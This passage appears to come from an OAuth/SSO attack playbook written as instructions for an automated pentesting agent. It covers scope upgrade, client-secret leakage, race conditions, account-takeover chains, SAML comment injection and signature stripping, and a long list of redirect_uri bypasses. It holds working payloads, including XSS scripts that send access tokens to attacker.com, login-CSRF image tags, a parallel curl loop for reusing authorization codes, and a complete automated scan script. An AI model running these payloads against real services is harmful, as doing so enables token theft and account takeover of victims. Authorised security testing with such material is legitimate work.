#       Remove code_verifier from token request

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 Scope Upgrade
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Request more permissions than allowed

# Original scope: scope=read
# Attack: scope=read write admin delete

# TEST: Add additional scopes and check if granted

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 Client Secret Leakage
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Look for client_secret in:
# - JavaScript files
# - Mobile app source (APK/IPA)
# - Error messages
# - GitHub/GitLab repos (search: client_secret target.com)

grep -rP 'client_secret' js_responses/
grep -rP 'clientSecret' js_responses/

# With client_secret â†’ can exchange codes for tokens
# â†’ Account takeover

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.4 Token Substitution
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Use access_token from one client on another

# If resource server doesn't validate audience:
# â†’ Get token for app1 (low privilege)
# â†’ Use on app2 (high privilege)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.5 Race Condition in Code Exchange
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Exchange same code multiple times
# If code not immediately invalidated â†’ get multiple tokens

for i in {1..10}; do
    curl -s -X POST "$TOKEN_URL" \
        -d "grant_type=authorization_code" \
        -d "code=$AUTH_CODE" \
        -d "client_id=$CLIENT_ID" \
        -d "client_secret=$CLIENT_SECRET" \
        -d "redirect_uri=$REDIRECT_URI" &
done
wait

================================================================================
PHASE 7: ACCOUNT TAKEOVER CHAINS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.1 Open Redirect â†’ Token Theft
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CHAIN:
# 1. Find open redirect on app.com: /redirect?url=
# 2. Craft OAuth URL with redirect_uri pointing to open redirect
# 3. Open redirect sends victim to attacker with code/token
# 4. Attacker exchanges code for access token
# 5. Account takeover!

# Payload:
https://auth.target.com/oauth/authorize?
  response_type=code&
  client_id=xxx&
  redirect_uri=https://app.target.com/redirect?url=https://attacker.com&
  scope=openid

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.2 XSS â†’ Token Theft
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CHAIN:
# 1. Find XSS on callback page or same origin
# 2. XSS steals token from URL fragment/localStorage/cookie
# 3. Send to attacker

# XSS payload to steal OAuth token:
<script>
fetch('https://attacker.com/steal?token='+
  (location.hash.match(/access_token=([^&]+)/)||['',''])[1]+
  '&ls='+localStorage.getItem('access_token')
);
</script>

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.3 CSRF + Missing State â†’ Login CSRF
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CHAIN:
# 1. No state parameter validation
# 2. Attacker logs in via OAuth, captures code
# 3. Sends callback URL to victim: /callback?code=ATTACKER_CODE
# 4. Victim clicks â†’ logged in as attacker
# 5. Victim enters credit card, address, etc.
# 6. Attacker accesses account, steals info

# Payload:
<img src="https://app.target.com/callback?code=ATTACKER_AUTH_CODE" />

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
7.4 IdP Confusion (Multi-IdP)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# ATTACK: Mix responses from different IdPs

# If SP supports multiple IdPs:
# 1. Register on WeakIdP with admin@target.com
# 2. Get SAML response for admin@target.com
# 3. Use response on SP (which trusts WeakIdP)
# 4. Logged in as admin@target.com!

================================================================================
ğŸ§  YOU ARE AN INTELLIGENT AGENT ğŸ§ 
================================================================================
OAuth/SSO attacks require understanding the entire flow.

RECONNAISSANCE FIRST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1. Find /.well-known/openid-configuration (contains ALL endpoints)
2. Identify OAuth flow type (authorization code vs implicit)
3. Extract client_id from JavaScript/responses
4. Note redirect_uri patterns in use
5. Check if state parameter is present/validated
6. Look for SAML endpoints if enterprise target

ATTACK PRIORITY:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Priority â”‚ Attack                      â”‚ Impact                            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 1        â”‚ redirect_uri bypass         â”‚ Direct token/code theft           â”‚
â”‚ 2        â”‚ Open redirect chain         â”‚ Token theft via allowed redirect  â”‚
â”‚ 3        â”‚ Missing state               â”‚ Login CSRF â†’ data theft           â”‚
â”‚ 4        â”‚ SAML signature bypass       â”‚ Impersonate any user              â”‚
â”‚ 5        â”‚ Client secret leakage       â”‚ Full OAuth abuse                  â”‚
â”‚ 6        â”‚ Token leakage (Referer)     â”‚ Passive token capture             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

CONTEXTUAL DECISIONS:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
IF redirect_uri strictly validated:
  â†’ Look for open redirects on same domain
  â†’ Try subdomain variations
  â†’ Test path traversal encodings
  
IF state parameter present:
  â†’ Check if actually validated on callback
  â†’ Test with modified/missing state
  â†’ Check for state reuse
  
IF SAML in use:
  â†’ Test signature stripping
  â†’ Try comment injection
  â†’ Check assertion replay

IF implicit flow:
  â†’ Token in URL fragment = HIGH RISK
  â†’ Check Referer leakage
  â†’ Check postMessage handling

VERIFICATION CHECKLIST:
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â–¡ Can redirect to attacker domain?
â–¡ Can capture authorization code?
â–¡ Can exchange code for token?
â–¡ Can access victim's resources with stolen token?
â–¡ Can force login as attacker (CSRF)?

================================================================================
COMMON MISTAKES TO AVOID
================================================================================
âŒ Not checking /.well-known/openid-configuration first
âŒ Testing only exact redirect_uri, not variations
âŒ Forgetting to chain with existing open redirects
âŒ Not testing implicit flow separately from code flow
âŒ Ignoring SAML when only testing OAuth
âŒ Not extracting client_id/secret from JavaScript
âŒ Missing postMessage handlers in JS analysis

================================================================================
SUCCESS CRITERIA
================================================================================
âœ“ OAuth/SSO endpoints discovered and documented
âœ“ redirect_uri validation bypass attempted with all techniques
âœ“ State parameter presence and validation tested
âœ“ Token leakage vectors identified
âœ“ SAML signature validation tested (if applicable)
âœ“ Complete attack chains documented
âœ“ Working exploits for token theft verified

================================================================================
QUICK REFERENCE: ATTACK PAYLOADS
================================================================================
# redirect_uri bypasses
redirect_uri=https://app.com/callback/../attacker.com
redirect_uri=https://app.com/callback?next=https://attacker.com
redirect_uri=https://attacker.app.com/callback
redirect_uri=https://app.com/redirect?url=https://attacker.com

# State attacks
# Simply remove &state= parameter
# Or set state=predictable_value

# SAML comment injection
<NameID>admin@target.com<!---->.user@target.com</NameID>

# Token theft XSS
<script>location='https://attacker.com?t='+location.hash</script>

# Login CSRF
<img src="https://app.com/callback?code=ATTACKER_CODE">

================================================================================
TOOL COMMANDS & CLI TOOLS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
OAuth Testing Tools
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# oauth-tester (Python) - Automated OAuth vulnerability scanner
pip install oauth-tester
oauth-tester --url "https://target.com/oauth/authorize" --client-id "xxx" --redirect-uri "https://app.com/callback"

# SSO-Scanner - Enterprise SSO vulnerability scanner
git clone https://github.com/AresS31/sso-scanner
python3 sso-scanner.py -u "https://target.com" -m oauth

# SAML-Raider-like CLI testing with xmlsec1
# Install: apt install xmlsec1
# Verify SAML signature
xmlsec1 --verify --pubkey-cert-pem cert.pem saml_response.xml

# Remove signature and test
xmlstarlet ed -d "//ds:Signature" saml_response.xml > saml_no_sig.xml

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Manual Testing Commands
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# OAuth endpoint discovery
curl -s https://target.com/.well-known/openid-configuration | jq .

# Test redirect_uri (check Location header)
curl -s -I "https://auth.target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://attacker.com"

# Full redirect_uri bypass test with all encodings
for payload in \
    "https://attacker.com" \
    "https://app.com/callback/../attacker.com" \
    "https://app.com/callback%2f..%2fattacker.com" \
    "https://attacker.app.com/callback" \
    "http://localhost/callback"; do
    echo "Testing: $payload"
    curl -s -o /dev/null -w "%{redirect_url}\n" \
        "https://auth.target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=$payload"
done

# Extract tokens from HAR
grep -oP 'access_token["\047]?\s*[:=]\s*["\047]?[A-Za-z0-9._-]+' har_file.har

# Look for client secrets
grep -rP 'client_secret|clientSecret' js_responses/

# Token exchange (if you have auth code)
curl -X POST "https://auth.target.com/oauth/token" \
    -d "grant_type=authorization_code" \
    -d "code=AUTH_CODE" \
    -d "redirect_uri=https://app.com/callback" \
    -d "client_id=CLIENT_ID" \
    -d "client_secret=CLIENT_SECRET"

# Test state parameter validation
# Step 1: Get auth URL with state
curl -s -I "https://auth.target.com/oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/callback&state=KNOWN_STATE&scope=openid"

# Step 2: Test callback without state
curl -s "https://app.com/callback?code=xxx"  # Should fail if secure

# Step 3: Test callback with wrong state
curl -s "https://app.com/callback?code=xxx&state=WRONG"  # Should fail if secure

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
SAML CLI Testing
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Decode SAML Response (Base64)
echo "SAML_RESPONSE_BASE64" | base64 -d | xmllint --format -

# Extract NameID from SAML
echo "SAML_RESPONSE_BASE64" | base64 -d | xmllint --xpath "//*[local-name()='NameID']/text()" -

# Modify SAML NameID (comment injection)
# Original: user@target.com
# Modified: admin@target.com<!---->.user@target.com
xmlstarlet ed -u "//*[local-name()='NameID']" -v "admin@target.com<!---->.user@target.com" saml.xml

# Re-encode for submission
cat modified_saml.xml | base64 -w0

# Test signature stripping
xmlstarlet ed -d "//*[local-name()='Signature']" saml.xml | base64 -w0

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Interactsh for OOB Token Capture  
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Start OOB listener for redirect_uri attacks
interactsh-client -v

# Use Interactsh URL as redirect_uri
redirect_uri=https://xyz123.interactsh.com/callback

# Captured requests show stolen auth codes!

================================================================================
COMPLETE AUTOMATED SCAN SCRIPT
================================================================================
#!/bin/bash
# oauth_sso_full_scan.sh

TARGET="$1"
CLIENT_ID="$2"
LEGIT_REDIRECT="$3"
OUTPUT_DIR="outputs/oauth_sso_attacks"

mkdir -p "$OUTPUT_DIR"

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo " OAuth/SSO Full Security Scan - $TARGET"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# PHASE 1: Discovery
echo "[*] Phase 1: Endpoint Discovery"
curl -s "$TARGET/.well-known/openid-configuration" > "$OUTPUT_DIR/openid_config.json"
cat "$OUTPUT_DIR/openid_config.json" | jq -r '.authorization_endpoint, .token_endpoint' 2>/dev/null

# PHASE 2: redirect_uri Testing
echo "[*] Phase 2: Testing redirect_uri bypasses"
AUTH_URL=$(cat "$OUTPUT_DIR/openid_config.json" | jq -r '.authorization_endpoint' 2>/dev/null)
if [ -z "$AUTH_URL" ] || [ "$AUTH_URL" == "null" ]; then
    AUTH_URL="$TARGET/oauth/authorize"
fi

BYPASS_PAYLOADS=(
    "https://attacker.com"
    "${LEGIT_REDIRECT}/../attacker.com"
    "${LEGIT_REDIRECT}%2f..%2fattacker.com"
    "${LEGIT_REDIRECT}?next=https://attacker.com"
    "${LEGIT_REDIRECT}#https://attacker.com"
    "https://attacker.${LEGIT_REDIRECT#https://}"
    "http://localhost/callback"
)

for payload in "${BYPASS_PAYLOADS[@]}"; do
    result=$(curl -s -o /dev/null -w "%{http_code}:%{redirect_url}" \
        "${AUTH_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${payload}&scope=openid")
    echo "  $payload â†’ $result" >> "$OUTPUT_DIR/redirect_uri_bypass.txt"
done

# PHASE 3: State Parameter Testing
echo "[*] Phase 3: Testing state parameter"
# Without state
curl -s -o /dev/null -w "No state: %{http_code}\n" \
    "${AUTH_URL}?response_type=code&client_id=${CLIENT_ID}&redirect_uri=${LEGIT_REDIRECT}&scope=openid" \
    >> "$OUTPUT_DIR/state_vulnerabilities.txt"

# PHASE 4: Client Secret Search
echo "[*] Phase 4: Searching for client secrets"
grep -rP 'client_secret|clientSecret' temp/agent1/js_responses/ 2>/dev/null >> "$OUTPUT_DIR/client_secrets.txt"

echo "[+] Scan complete. Results in $OUTPUT_DIR"

================================================================================
FULL REDIRECT_URI BYPASS PAYLOAD LIST
================================================================================
# Save as: wordlists/oauth_redirect_bypasses.txt
# Replace LEGIT with actual legitimate redirect_uri
# Replace EVIL with attacker domain

LEGIT/../EVIL
LEGIT/..%2fEVIL
LEGIT%2f..%2fEVIL
LEGIT/../../../EVIL
LEGIT%2f..%2f..%2f..%2fEVIL
LEGIT?next=EVIL
LEGIT?url=EVIL
LEGIT?redirect=EVIL
LEGIT?return=EVIL
LEGIT?returnTo=EVIL
LEGIT?return_to=EVIL
LEGIT?continue=EVIL
LEGIT?dest=EVIL
LEGIT?destination=EVIL
LEGIT?go=EVIL
LEGIT?goto=EVIL
LEGIT?target=EVIL
LEGIT?to=EVIL
LEGIT?link=EVIL
LEGIT?out=EVIL
LEGIT?view=EVIL
LEGIT?ref=EVIL
LEGIT#EVIL
LEGIT/.EVIL
LEGIT\@EVIL
LEGIT%00EVIL
LEGIT%00.EVIL
LEGIT%00@EVIL
EVIL?trusted=LEGIT
EVIL#LEGIT
EVIL\.LEGIT
http://LEGIT_HOST/callback
https://EVIL.LEGIT_HOST/callback
https://LEGIT_HOST.EVIL/callback
https://EVIL%40LEGIT_HOST/callback
https://EVIL%23LEGIT_HOST/callback

